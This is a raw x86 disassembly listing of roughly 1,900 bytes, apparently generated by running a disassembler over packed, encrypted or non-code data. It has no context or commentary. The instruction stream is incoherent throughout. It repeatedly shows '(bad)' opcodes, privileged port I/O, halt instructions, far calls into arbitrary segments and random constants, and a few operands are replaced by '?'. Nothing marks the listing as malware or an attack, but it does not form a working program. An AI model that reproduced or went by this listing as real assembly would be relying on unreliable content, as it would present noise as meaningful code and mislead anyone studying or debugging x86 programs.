  43b79a:	mov    dl,BYTE PTR [eax+eax*8+0x12519a04]
  43b7a1:	mov    dh,0x84
  43b7a3:	xchg   ebx,eax
  43b7a4:	xor    bl,BYTE PTR [ecx-0x44]
  43b7a7:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  43b7a8:	std    
  43b7a9:	scas   eax,DWORD PTR es:[edi]
  43b7aa:	or     eax,0xffffffcb
  43b7ad:	in     eax,dx
  43b7ae:	cmp    ecx,DWORD PTR [ebx]
  43b7b0:	mov    cl,0x32
  43b7b2:	repz pop ebp
  43b7b4:	adc    eax,0xeb274e5e
  43b7b9:	fwait
  43b7ba:	sti    
  43b7bb:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  43b7bc:	cdq    
  43b7bd:	retf   0x6335
  43b7c0:	dec    ebx
  43b7c1:	dec    ecx
  43b7c2:	and    edx,DWORD PTR [edx+esi*4]
  43b7c5:	or     al,0x28
  43b7c7:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  43b7c8:	xchg   di,ax
  43b7ca:	popa   
  43b7cb:	pop    ecx
  43b7cc:	inc    ebx
  43b7cd:	or     dh,BYTE PTR [eax]
  43b7cf:	dec    esi
  43b7d0:	mov    ds:0x1dbf9491,al
  43b7d5:	hlt    
  43b7d6:	push   ebp
  43b7d7:	(bad)  
  43b7d8:	adc    al,0xcf
  43b7da:	add    eax,DWORD PTR [ebx]
  43b7dc:	mov    bl,0x3b
  43b7de:	addr16 xlat BYTE PTR ds:[bx]
  43b7e1:	mov    esi,0x9cc25f86
  43b7e6:	sti    
  43b7e7:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  43b7e8:	(bad)  
  43b7e9:	mov    fs,WORD PTR [edx-0x22776a64]
  43b7ef:	mov    BYTE PTR [edi+0x786a64e0],dh
  43b7f5:	jg     0x43b851
  43b7f7:	mov    al,0xe5
  43b7f9:	mov    dl,0xce
  43b7fb:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  43b7fc:	stos   BYTE PTR es:[edi],al
  43b7fd:	(bad)  
  43b7fe:	mov    eax,0x424fd1ef
  43b803:	jmp    0xa09bf602
  43b808:	mov    edi,0xd8693c
  43b80d:	sbb    ah,BYTE PTR [ebx-0x5671b019]
  43b813:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  43b814:	(bad)  
  43b815:	dec    esi
  43b816:	ret    
  43b817:	push   ss
  43b818:	mov    ebx,0xb2e1e999
  43b81d:	jno    0x43b878
  43b81f:	std    
  43b820:	adc    al,0xda
  43b822:	sub    esp,eax
  43b824:	jb     0x43b831
  43b826:	(bad)  
  43b827:	pop    edx
  43b828:	jns    0x43b7d8
  43b82a:	dec    eax
  43b82b:	pop    ebx
  43b82c:	in     al,0x1d
  43b82e:	mov    eax,ds:0xdc8b360a
  43b833:	cmp    BYTE PTR [eax+0x71],ch
  43b836:	and    DWORD PTR ds:0x11d80b52,edi
  43b83c:	shr    ah,1
  43b83e:	imul   eax,DWORD PTR [esi+0x6f],0xb9129ab1
  43b845:	mov    WORD PTR [edi],ds
  43b847:	(bad)  
  43b849:	sbb    eax,0x58aaa7f7
  43b84e:	(bad)  
  43b84f:	cld    
  43b850:	xor    al,0x24
  43b852:	push   cs
  43b853:	cmp    eax,0x7bf3f096
  43b858:	mov    dl,0x5
  43b85a:	mov    ah,0xbd
  43b85c:	jg     0x43b800
  43b85e:	dec    esp
  43b85f:	mov    al,ds:0xf0fe16df
  43b864:	mov    ebp,DWORD PTR [edx-0x2f4567c5]
  43b86a:	or     bl,BYTE PTR [eax]
  43b86c:	test   eax,0x413bb256
  43b871:	mov    ds:0xeaa30b9a,eax
  43b876:	rcl    edx,cl
  43b878:	and    edx,DWORD PTR [edx-0x2535596d]
  43b87e:	pop    ebx
  43b87f:	pop    es
  43b880:	pop    es
  43b881:	push   cs
  43b882:	jecxz  0x43b8cf
  43b884:	jb     0x43b86d
  43b886:	call   0x207a:0x5da813ac
  43b88d:	inc    edx
  43b88e:	jle    0x43b837
  43b890:	arpl   WORD PTR [ecx],sp
  43b892:	jno    0x43b8de
  43b894:	test   BYTE PTR [edi-0x3c529d98],al
  43b89a:	pop    eax
  43b89b:	lock mov dl,0xf4
  43b89e:	mov    ecx,0x79e9ebae
  43b8a3:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  43b8a4:	gs jne 0x43b908
  43b8a7:	mov    bh,0x3d
  43b8a9:	pop    esi
  43b8aa:	inc    eax
  43b8ab:	jns    0x43b84e
  43b8ad:	sbb    al,0x35
  43b8af:	or     eax,0x964af2b2
  43b8b4:	and    al,0x1f
  43b8b6:	jecxz  0x43b8f7
  43b8b8:	adc    dh,BYTE PTR [edx-0x58]
  43b8bb:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  43b8bc:	add    al,0x5d
  43b8be:	sub    BYTE PTR [eax+0x4d],dl
  43b8c1:	xchg   esi,eax
  43b8c2:	pop    ebp
  43b8c3:	or     BYTE PTR [eax+0x50eeae40],dh
  43b8c9:	ds mov edi,fs
  43b8cc:	cmp    eax,0x93a917da
  43b8d1:	cmp    BYTE PTR [edx],dl
  43b8d3:	repz sub eax,0x1044bf8a
  43b8d9:	and    bl,BYTE PTR [edx+0x4f]
  43b8dc:	fisubr DWORD PTR [esi+0x7413f79a]
  43b8e2:	xchg   esi,eax
  43b8e3:	test   al,0xd8
  43b8e5:	cmp    al,0xec
  43b8e7:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  43b8e8:	fisubr WORD PTR [eax+0x598049cc]
  43b8ee:	jae    0x43b961
  43b8f0:	mov    dl,0xe1
  43b8f2:	arpl   WORD PTR ds:0xca8f416f,di
  43b8f8:	mov    edi,0x63561b14
  43b8fd:	mov    ebp,DWORD PTR [edx]
  43b8ff:	and    al,0xc1
  43b901:	mov    dh,0xd6
  43b903:	fdiv   QWORD PTR [ecx-0x5bc8f00]
  43b909:	lock mov eax,0x850325b
  43b90f:	ret    0xb94
  43b912:	pop    ebx
  43b913:	sub    eax,0x2a695d7e
  43b918:	pop    ds
  43b919:	jl     0x43b8b5
  43b91b:	jmp    0x43b8b3
  43b91d:	push   ds
  43b91e:	push   0x2df08f64
  43b923:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  43b924:	lahf   
  43b925:	cwde   
  43b926:	adc    eax,0xb0fbc09d
  43b92b:	pop    ss
  43b92c:	mov    dl,0xc3
  43b92e:	dec    eax
  43b92f:	adc    ecx,ebx
  43b931:	outs   dx,BYTE PTR ds:[esi]
  43b932:	cmp    bh,al
  43b934:	inc    esp
  43b935:	add    eax,0x7269db0d
  43b93a:	mov    edx,0xb5cd6668
  43b93f:	xchg   BYTE PTR [edx-0x321879a1],dh
  43b945:	fidiv  WORD PTR fs:[eax+0x7fe004e8]
  43b94c:	jbe    0x43b90b
  43b94e:	jp     0x43b96d
  43b950:	fs mov ah,0x3b
  43b953:	or     DWORD PTR [esi-0x4889b9ab],ebp
  43b959:	mov    ds:0x337272b4,al
  43b95e:	sub    dl,BYTE PTR ds:0x40540b83
  43b964:	repz dec esp
  43b966:	ret    
  43b967:	mov    bl,0x4e
  43b969:	sub    eax,0x5babea98
  43b96e:	add    cl,BYTE PTR [eax-0xe]
  43b971:	imul   esp,esp,0xd
  43b974:	pop    edx
  43b975:	or     BYTE PTR [ebx],bh
  43b977:	ja     0x43b9a2
  43b979:	add    DWORD PTR [edx+0x12ae418c],0xffffff9e
  43b980:	mov    bh,0xc3
  43b982:	xchg   esp,eax
  43b983:	or     BYTE PTR [ecx+ebp*2+0x3],al
  43b987:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  43b988:	lock pusha 
  43b98a:	jmp    0x43b9d2
  43b98c:	push   ecx
  43b98d:	mov    edx,DWORD PTR [esi]
  43b98f:	sbb    DWORD PTR [edx+0xb],esp
  43b992:	xchg   BYTE PTR [edx],bh
  43b994:	in     al,dx
  43b995:	or     BYTE PTR [edx-0x65911c5d],ah
  43b99b:	mov    BYTE PTR [edi-0x1f],0xe4
  43b99f:	push   edi
  43b9a0:	sbb    eax,0x53a4a4ed
  43b9a5:	mov    ebp,0x726f5d63
  43b9aa:	push   ebp
  43b9ab:	push   edi
  43b9ac:	les    esp,FWORD PTR [esi-0x1a4da3c8]
  43b9b2:	out    0xf7,al
  43b9b4:	mov    ecx,DWORD PTR [edx+ebp*2+0x480b763b]
  43b9bb:	push   0xc9ec4508
  43b9c0:	push   ebp
  43b9c1:	sbb    DWORD PTR [edx-0x7dd408f4],0x67dcc32b
  43b9cb:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  43b9cc:	aam    0xc5
  43b9ce:	push   cs
  43b9cf:	mov    al,ds:0xa6c3b528
  43b9d4:	mov    dl,0xe8
  43b9d6:	mov    bh,0xa8
  43b9d8:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  43b9d9:	lock ret 0x7bf0
  43b9dd:	and    eax,0xbd76caa
  43b9e2:	mov    edi,0xb8bd5873
  43b9e7:	or     BYTE PTR [edx-0x49a0e897],dh
  43b9ed:	test   DWORD PTR [ecx+0x61],ebp
  43b9f0:	fisttp WORD PTR [ebx]
  43b9f2:	cs loope 0x43ba1c
  43b9f5:	mov    esp,0xee773af1
  43b9fa:	xchg   esi,esi
  43b9fc:	pop    ds
  43b9fd:	jno    0x43ba12
  43b9ff:	pop    ebp
  43ba00:	push   ds
  43ba01:	or     BYTE PTR [edi],bh
  43ba03:	arpl   WORD PTR [ebp-0x75],di
  43ba06:	xchg   DWORD PTR [esi],esi
  43ba08:	jg     0x43ba16
  43ba0a:	vpsubsw ymm2,ymm7,YMMWORD PTR [ebx+0x5c9d4762]
  43ba12:	sub    ch,bl
  43ba14:	mov    cl,0xd
  43ba16:	push   cs
  43ba17:	fcom   QWORD PTR [ebx+edx*8+0x5c]
  43ba1b:	xor    dl,al
  43ba1d:	pusha  
  43ba1e:	mov    ecx,0xc70b285d
  43ba23:	pop    edi
  43ba24:	adc    eax,0xe24ba366
  43ba29:	xchg   esi,eax
  43ba2a:	call   0xd4a3:0x33af8925
  43ba31:	adc    al,0xf3
  43ba33:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  43ba34:	xchg   BYTE PTR [ebx+0x159ecc98],dl
  43ba3a:	ror    BYTE PTR [ecx-0x4e],1
  43ba3d:	ror    BYTE PTR [edi+0x1a],cl
  43ba40:	sti    
  43ba41:	jns    0x43ba0e
  43ba43:	push   DWORD PTR [ecx-0x4d36c4cc]
  43ba49:	and    DWORD PTR [esi],esp
  43ba4b:	imul   eax,DWORD PTR [ecx-0x35ffd200],0x89629a9a
  43ba55:	sbb    DWORD PTR [ecx-0xd],ecx
  43ba58:	sub    esi,DWORD PTR [ecx+0x79]
  43ba5b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  43ba5c:	mov    al,0xfd
  43ba5e:	sub    BYTE PTR [esi-0x74557b06],ah
  43ba64:	lods   eax,DWORD PTR ds:[esi]
  43ba65:	shl    DWORD PTR [ebp+0x36],cl
  43ba68:	mov    dl,0xb6
  43ba6a:	mov    esp,0x6b49bcce
  43ba6f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  43ba70:	add    BYTE PTR [ecx+0x76e720f5],ch
  43ba76:	pop    esp
  43ba77:	shl    DWORD PTR [edx+0x15764157],1
  43ba7d:	mov    eax,ds:0xb70d30c
  43ba82:	ds (bad) 
  43ba84:	xchg   ebp,eax
  43ba85:	mov    dh,0xe
  43ba87:	fs pusha 
  43ba89:	stos   BYTE PTR es:[edi],al
  43ba8a:	test   BYTE PTR [esi-0x5f],ah
  43ba8d:	pop    eax
  43ba8e:	xchg   ebp,eax
  43ba8f:	mov    eax,0x50a8aba6
  43ba94:	(bad)  
  43ba95:	ror    BYTE PTR ds:0x7073c5a7,1
  43ba9b:	pushf  
  43ba9c:	mov    ds:0xf84a96e0,al
  43baa1:	cwde   
  43baa2:	call   0xb179:0xa299bcc2
  43baa9:	or     edi,eax
  43baab:	out    dx,al
  43baac:	cmp    cl,ch
  43baae:	add    al,0x9e
  43bab0:	push   edx
  43bab1:	pop    esi
  43bab2:	loopne 0x43ba43
  43bab4:	mov    dl,0x37
  43bab6:	or     ebx,DWORD PTR [ecx]
  43bab8:	push   ecx
  43bab9:	adc    eax,DWORD PTR [esi]
  43babb:	pop    ds
  43babc:	int    0xb
  43babe:	xor    esp,ebp
  43bac0:	sub    ch,BYTE PTR [eax+0x2cacb21b]
  43bac6:	xchg   ebp,eax
  43bac7:	ins    DWORD PTR es:[edi],dx
  43bac8:	es lock clc 
  43bacb:	inc    edi
  43bacc:	xchg   esi,eax
  43bacd:	out    0xfa,eax
  43bacf:	xchg   esi,ebp
  43bad1:	in     eax,0xb
  43bad3:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  43bad4:	repz rcl BYTE PTR [eax],cl
  43bad7:	push   esi
  43bad8:	push   edi
  43bad9:	add    BYTE PTR [edi],0xd2
  43badc:	mov    dl,0x86
  43bade:	push   0x14
  43bae0:	sbb    DWORD PTR [esi],ebx
  43bae2:	lds    esi,FWORD PTR [ecx+0xd53053]
  43bae8:	mov    bh,0xf5
  43baea:	jl     0x43ba7f
  43baec:	jg     0x43baba
  43baee:	and    eax,0xb6d7ebe7
  43baf3:	cmp    al,0xbd
  43baf5:	loope  0x43bb43
  43baf7:	es ja  0x43bb5e
  43bafa:	fldenv [edi-0x3252d90a]
  43bb00:	nop
  43bb01:	or     BYTE PTR [ebx-0x40de2f6c],dl
  43bb07:	jmp    0x93de5d11
  43bb0c:	and    BYTE PTR [ecx+ecx*4+0xe438a0f],bh
  43bb13:	pop    ds
  43bb14:	push   ebp
  43bb15:	mov    edi,esi
  43bb17:	fwait
  43bb18:	ja     0x43bb0c
  43bb1a:	cli    
  43bb1b:	sub    al,0xea
  43bb1d:	or     eax,eax
  43bb1f:	dec    BYTE PTR [edi-0x5b269090]
  43bb25:	sub    DWORD PTR [edx-0x2510d580],ebx
  43bb2b:	ins    BYTE PTR es:[edi],dx
  43bb2c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  43bb2d:	and    dh,BYTE PTR [edi-0x56f4b2a5]
  43bb33:	js     0x43bb48
  43bb35:	test   BYTE PTR [eax+edi*8],ch
  43bb38:	enter  0x256a,0xa7
  43bb3c:	push   0x2f9c2808
  43bb41:	or     esi,edi
  43bb43:	and    eax,DWORD PTR [edx]
  43bb45:	scas   al,BYTE PTR es:[edi]
  43bb46:	mov    ah,0xbf
  43bb48:	adc    BYTE PTR es:[eax-0x2774756b],ah
  43bb4f:	or     DWORD PTR [edi-0x22],esi
  43bb52:	add    eax,DWORD PTR [eax+0x0]
  43bb55:	adc    al,0xaf
  43bb57:	add    eax,0xe7d7960a
  43bb5c:	mov    ds:0x8a4baebe,al
  43bb61:	pusha  
  43bb62:	pusha  
  43bb63:	ss dec eax
  43bb65:	icebp  
  43bb66:	push   0xffffffcd
  43bb68:	mov    dl,0xf4
  43bb6a:	test   al,0x3
  43bb6c:	sbb    BYTE PTR [esi+0x7b11af32],al
  43bb72:	cld    
  43bb73:	fucomip st,st(2)
  43bb75:	or     ecx,DWORD PTR [ebx-0x4d]
  43bb78:	xchg   DWORD PTR [edi+eax*4-0x655de30b],esi
  43bb7f:	loopne 0x43bc00
  43bb81:	dec    ecx
  43bb82:	push   ebx
  43bb83:	stc    
  43bb84:	fcom   DWORD PTR ds:0x607a7a0
  43bb8a:	jo     0x43bbfe
  43bb8c:	mov    bl,0xe0
  43bb8e:	lea    esi,[ebx-0x74]
  43bb91:	retf   
  43bb92:	mov    fs,WORD PTR [edi+0x69f0a457]
  43bb98:	leave  
  43bb99:	sar    ebx,1
  43bb9b:	pop    ebp
  43bb9c:	cmp    al,0xb
  43bb9e:	xchg   esi,eax
  43bb9f:	fild   QWORD PTR [edi+0x3e]
  43bba2:	das    
  43bba3:	ret    
  43bba4:	loop   0x43bb38
  43bba6:	call   0x5d9:0x8f47536e
  43bbad:	dec    ebp
  43bbae:	mov    eax,ds:0x115efa7
  43bbb3:	mov    ah,0x1f
  43bbb5:	xchg   ebp,eax
  43bbb6:	call   0x44936e8b
  43bbbb:	sub    eax,0xc48ec9a4
  43bbc0:	mov    ah,0x4
  43bbc2:	xchg   edx,eax
  43bbc3:	ins    DWORD PTR es:[edi],dx
  43bbc4:	shr    BYTE PTR [eax],1
  43bbc6:	stc    
  43bbc7:	mov    al,ds:0x88127ed3
  43bbcc:	in     al,dx
  43bbcd:	jb     0x43bb6a
  43bbcf:	dec    ebx
  43bbd0:	(bad)  
  43bbd1:	fisttp DWORD PTR [ecx]
  43bbd3:	icebp  
  43bbd4:	mov    ecx,0x9f127ac3
  43bbd9:	or     edx,DWORD PTR [edi-0x69b2dd4a]
  43bbdf:	pop    esp
  43bbe0:	add    BYTE PTR [ecx],0x9a
  43bbe3:	sti    
  43bbe4:	out    0xb9,eax
  43bbe6:	mov    cl,0xf1
  43bbe8:	arpl   WORD PTR [ecx],di
  43bbea:	dec    ecx
  43bbeb:	pop    es
  43bbec:	sbb    eax,0x84a74876
  43bbf1:	adc    DWORD PTR [ebp+0x3566a0dd],esi
  43bbf7:	fdiv   DWORD PTR [edx+0x3821e5d]
  43bbfd:	fdivr  DWORD PTR [esi+0x4]
  43bc00:	(bad)  
  43bc01:	out    0x91,eax
  43bc03:	test   eax,0x70430524
  43bc08:	rep lods eax,DWORD PTR ds:[esi]
  43bc0a:	jne    0x43bbb6
  43bc0c:	jne    0x43bbd5
  43bc0e:	dec    ecx
  43bc0f:	sub    DWORD PTR [edx+0x725f7dc9],esi
  43bc15:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  43bc16:	sub    DWORD PTR [edi+eax*8+0xb],edi
  43bc1a:	(bad)
  43bc1e:	cmp    al,0xcc
  43bc20:	and    DWORD PTR [ebp-0x6eb3cd66],ebx
  43bc26:	(bad)  
  43bc27:	fcom   DWORD PTR [ebp+0x11a71608]
  43bc2d:	xlat   BYTE PTR ds:[ebx]
  43bc2e:	push   edx
  43bc2f:	jp     0x43bc0b
  43bc31:	mov    WORD PTR [esi+0x72],?
  43bc34:	mov    dl,0x10
  43bc36:	inc    edx
  43bc37:	xlat   BYTE PTR ds:[ebx]
  43bc38:	inc    ebp
  43bc39:	leave  
  43bc3a:	cmc    
  43bc3b:	test   DWORD PTR [ecx+0x325ee630],eax
  43bc41:	adc    BYTE PTR [edi+0x2d],0xdf
  43bc45:	mov    ds:0xcdafd093,eax
  43bc4a:	cmp    al,0xdd
  43bc4c:	mov    DWORD PTR [ebx],ecx
  43bc4e:	popf   
  43bc4f:	repnz lea ecx,[eax+0x6a]
  43bc53:	aas    
  43bc54:	cmp    BYTE PTR [ecx-0x67],0xa2
  43bc58:	cmp    eax,DWORD PTR [edi-0x34b4ca54]
  43bc5e:	fnstsw WORD PTR [ebp-0x22]
  43bc61:	add    BYTE PTR [edx+0x3a4f9dd8],bl
  43bc67:	lahf   
  43bc68:	mov    al,0x77
  43bc6a:	in     al,0x9a
  43bc6c:	jb     0x43bc4e
  43bc6e:	sbb    al,BYTE PTR [edi+0x1fce1974]
  43bc74:	pop    edx
  43bc75:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  43bc76:	call   0x83b3:0x79f234ba
  43bc7d:	fwait
  43bc7e:	sbb    BYTE PTR [esi+0xf33b9c7],ah
  43bc84:	adc    dh,BYTE PTR [esi]
  43bc86:	pop    ss
  43bc87:	(bad)  
  43bc88:	fs inc edi
  43bc8a:	out    dx,eax
  43bc8b:	jno    0x43bc48
  43bc8d:	adc    bh,cl
  43bc8f:	das    
  43bc90:	in     al,dx
  43bc91:	or     edx,DWORD PTR [ecx+edi*1-0x7e]
  43bc95:	jge    0x43bc32
  43bc97:	mov    eax,0xa434dade
  43bc9c:	int    0xc8
  43bc9e:	xchg   ebx,eax
  43bc9f:	shr    DWORD PTR [edx],0x87
  43bca2:	ins    BYTE PTR es:[edi],dx
  43bca3:	enter  0x2eb2,0x32
  43bca7:	xchg   ebp,eax
  43bca8:	sbb    eax,0xb067b013
  43bcad:	or     al,0xbc
  43bcaf:	arpl   WORD PTR ds:0x64f48be8,cx
  43bcb5:	mov    dl,0x5a
  43bcb7:	xchg   esp,eax
  43bcb8:	mov    ecx,DWORD PTR [edi-0x6c]
  43bcbb:	and    al,0x68
  43bcbd:	sub    al,0x13
  43bcbf:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  43bcc0:	add    DWORD PTR [edi+0x57],edi
  43bcc3:	hlt    
  43bcc4:	push   edx
  43bcc5:	add    bh,BYTE PTR [edi]
  43bcc7:	xor    DWORD PTR [ecx+0x7c0e1dd5],ebx
  43bccd:	mov    ebx,0xc73928bf
  43bcd2:	(bad)  
  43bcd3:	out    dx,al
  43bcd4:	dec    eax
  43bcd5:	or     ebx,DWORD PTR [ebp+0x6]
  43bcd8:	sar    eax,0xf
  43bcdb:	pop    esp
  43bcdc:	lock or ecx,DWORD PTR [ebx-0x249b5ef]
  43bce3:	inc    edi
  43bce4:	sbb    al,BYTE PTR [ebp+0x4e242d9a]
  43bcea:	xchg   edx,eax
  43bceb:	or     ah,bh
  43bced:	popa   
  43bcee:	jge    0x43bcaa
  43bcf0:	in     eax,0xe3
  43bcf2:	das    
  43bcf3:	daa    
  43bcf4:	jle    0x43bd14
  43bcf6:	or     bl,bh
  43bcf8:	popf   
  43bcf9:	retf   
  43bcfa:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  43bcfb:	repz cs jo 0x43bc99
  43bcff:	call   0xe815138
  43bd04:	jg     0x43bce6
  43bd06:	ins    BYTE PTR es:[edi],dx
  43bd07:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  43bd08:	sbb    DWORD PTR [edx-0x2f6f86f7],ebx
  43bd0e:	adc    al,ah
  43bd10:	mov    dl,0x45
  43bd12:	popf   
  43bd13:	mov    edi,DWORD PTR ds:0x3af02c3f
  43bd19:	push   cs
  43bd1a:	dec    ebp
  43bd1b:	aaa    
  43bd1c:	fild   DWORD PTR [esi]
  43bd1e:	cmp    ah,BYTE PTR [edi+0x659c533f]
  43bd24:	rcl    BYTE PTR [edx-0x11],1
  43bd27:	ins    BYTE PTR es:[edi],dx
  43bd28:	mov    DWORD PTR [esi+0x6e00a8dc],ecx
  43bd2e:	jp     0x43bcd7
  43bd30:	cmp    eax,0xa89632cf
  43bd35:	or     bh,BYTE PTR [edi+0x7d]
  43bd38:	clc    
  43bd39:	out    dx,eax
  43bd3a:	push   esi
  43bd3b:	ror    cl,1
  43bd3d:	into   
  43bd3e:	and    bl,BYTE PTR [edi-0x15]
  43bd41:	jnp    0x43bce1
  43bd43:	jbe    0x43bd75
  43bd45:	(bad)  
  43bd47:	push   esi
  43bd48:	xor    dl,BYTE PTR [ebx-0x5e]
  43bd4b:	hlt    
  43bd4c:	retf   0x90a
  43bd4f:	mov    cl,0x4e
  43bd51:	mov    al,0xee
  43bd53:	sbb    BYTE PTR [edi],dh
  43bd55:	sti    
  43bd56:	mov    bh,0xd7
  43bd58:	mov    bl,0x3
  43bd5a:	xchg   edi,eax
  43bd5b:	xchg   edi,eax
  43bd5c:	mov    ebx,0xf24d864d
  43bd61:	mov    ebp,0xbac0ff4
  43bd66:	sbb    DWORD PTR [eax-0x35],edx
  43bd69:	stos   BYTE PTR es:[edi],al
  43bd6a:	out    dx,al
  43bd6b:	dec    edx
  43bd6c:	add    al,0xa2
  43bd6e:	test   BYTE PTR [esp+edx*1+0x39979b6e],bh
  43bd75:	xor    BYTE PTR [edi],cl
  43bd77:	jmp    0x633e:0xa770c2c2
  43bd7e:	in     al,dx
  43bd7f:	jg     0x43bd84
  43bd81:	aad    0x28
  43bd83:	or     BYTE PTR [ecx+0x39a734f7],0xa0
  43bd8a:	cld    
  43bd8b:	mov    ds:0xa915af4f,al
  43bd90:	add    eax,0xd20ab89f
  43bd95:	pop    edx
  43bd96:	jecxz  0x43bd34
  43bd98:	cwde   
  43bd99:	fwait
  43bd9a:	call   0x412:0xe1089949
  43bda1:	call   0x4143620c
  43bda6:	jno    0x43be0e
  43bda8:	clc    
  43bda9:	dec    esi
  43bdaa:	jp     0x43bdc6
  43bdac:	mov    esi,esp
  43bdae:	call   0x5d9f:0x8376d298
  43bdb5:	(bad)  
  43bdb6:	(bad)  [esi+0x6d7bd6bf]
  43bdbc:	jle    0x43be30
  43bdbe:	pop    es
  43bdbf:	addr16 or al,0x7f
  43bdc2:	call   0xe3f3:0xef6cdc15
  43bdc9:	xor    al,0x1c
  43bdcb:	out    dx,eax
  43bdcc:	xchg   esi,eax
  43bdcd:	rcr    DWORD PTR [ecx+0x23956676],0x9a
  43bdd4:	adc    dh,bl
  43bdd6:	(bad)  
  43bdd7:	cmp    cl,BYTE PTR [eax+0x10c965e8]
  43bddd:	dec    ebx
  43bdde:	outs   dx,DWORD PTR ds:[esi]
  43bddf:	pop    es
  43bde0:	mov    BYTE PTR [eax-0x6b],al
  43bde3:	mov    eax,0x3a7a7fd5
  43bde8:	clc    
  43bde9:	retf   
  43bdea:	adc    cl,BYTE PTR gs:[ebx-0x50]
  43bdee:	pop    ecx
  43bdef:	adc    BYTE PTR [eax+0x19],cl
  43bdf2:	popf   
  43bdf3:	inc    ebx
  43bdf4:	jmp    0x43be17
  43bdf6:	aaa    
  43bdf7:	sahf   
  43bdf8:	ror    BYTE PTR [eax-0x52],cl
  43bdfb:	mov    al,0x6d
  43bdfd:	or     edi,DWORD PTR [ebp+0x61]
  43be00:	outs   dx,DWORD PTR ds:[esi]
  43be01:	dec    esp
  43be02:	jnp    0x43be2d
  43be04:	and    ch,ch
  43be06:	jmp    0x43bdd6
  43be08:	mov    bl,0x66
  43be0a:	sub    eax,0x8d5bc14
  43be0f:	push   eax
  43be10:	rol    BYTE PTR [esi-0x38],cl
  43be13:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  43be14:	fadd   st(5),st
  43be16:	shl    BYTE PTR [edx-0x645c160e],cl
  43be1c:	mov    dl,0x83
  43be1e:	push   es
  43be1f:	int3   
  43be20:	out    dx,al
  43be21:	sub    DWORD PTR [ebx-0x7df745b5],ebx
  43be27:	aam    0xa6
  43be29:	ja     0x43be0e
  43be2b:	nop
  43be2c:	adc    ah,dl
  43be2e:	retf   
  43be2f:	ins    BYTE PTR es:[edi],dx
  43be30:	mov    dl,0xa5
  43be32:	call   0xeff0a368
  43be37:	xor    ecx,DWORD PTR [ecx-0x2e3c24d2]
  43be3d:	dec    ecx
  43be3e:	add    dl,BYTE PTR [eax+0x74]
  43be41:	sti    
  43be42:	call   0xcd83:0xb0075b48
  43be49:	xor    al,0xa2
  43be4b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  43be4c:	xchg   ecx,eax
  43be4d:	sub    al,0xd
  43be4f:	cmp    esp,DWORD PTR [edi+eax*8+0xf]
  43be53:	addr16 mov dl,0x40
  43be56:	cmp    BYTE PTR [edi],al
  43be58:	pop    edx
  43be59:	adc    DWORD PTR [esi+eax*2],esp
  43be5c:	stos   DWORD PTR es:[edi],eax
  43be5d:	lock push ebx
  43be5f:	xchg   BYTE PTR [edx+0x2da054c9],dl
  43be65:	fsubr  QWORD PTR [eax]
  43be67:	or     BYTE PTR [esi+0x70f57c7b],0xdb
  43be6e:	call   0x26c5:0x234247d2
  43be75:	js     0x43be69
  43be77:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  43be78:	into   
  43be79:	stos   DWORD PTR es:[edi],eax
  43be7a:	pop    esp
  43be7b:	mov    ebx,0x4292449a
  43be80:	lea    ebp,[ecx-0x462b5f49]
  43be86:	(bad)  
  43be87:	dec    ebp
  43be88:	adc    dl,BYTE PTR [ebp-0x7c]
  43be8b:	xchg   BYTE PTR [edx-0x5246af03],al
  43be91:	lods   al,BYTE PTR ds:[esi]
  43be92:	jmp    0x9a988645
  43be97:	xor    ebx,DWORD PTR [ebx]
  43be99:	in     eax,0x92
  43be9b:	call   0x927b9d52
  43bea0:	aad    0xc3
  43bea2:	call   0x194f045c
  43bea7:	sbb    al,0xd1
  43bea9:	pop    edi
  43beaa:	adc    ah,BYTE PTR [si]
  43bead:	dec    ebx
  43beae:	mov    al,ds:0xff0b3d44
  43beb3:	call   0xcfa:0x276ebd26
  43beba:	and    DWORD PTR [ebp-0x65],ebx
  43bebd:	jnp    0x43be77
  43bebf:	xchg   ebx,edi
  43bec1:	or     al,0xe3
  43bec3:	xchg   sp,ax
  43bec5:	dec    esp
  43bec6:	rol    BYTE PTR [edx-0x51],0x49
  43beca:	test   BYTE PTR [eax-0xe],al
  43becd:	and    DWORD PTR [ecx],ebx
  43becf:	or     DWORD PTR [edx],eax
  43bed1:	fwait
  43bed2:	inc    ebx
  43bed3:	aaa    
  43bed4:	sbb    ebp,ebp
  43bed6:	and    al,0xa7
  43bed8:	ss mov edi,0x8b2c4645
  43bede:	jb     0x43bea3
  43bee0:	mov    dl,0xec
  43bee2:	dec    ecx
  43bee3:	add    BYTE PTR [esi],ah
  43bee5:	xor    DWORD PTR [ebx-0x5af4a60f],edi
  43beeb:	xchg   esi,eax
  43beec:	dec    esi
  43beed:	test   DWORD PTR [edi],ebp
  43beef:	mov    ?,WORD PTR [esi-0x5]
  43bef2:	jecxz  0x43bead
  43bef4:	mov    dl,0x2e
  43bef6:	dec    ebp
  43bef7:	add    esi,eax
  43bef9:	ds leave 
  43befb:	in     al,0x3e
  43befd:	or     edx,DWORD PTR [esi-0x51b54f26]
  43bf03:	cmp    DWORD PTR [eax-0x31],0x342fb59a
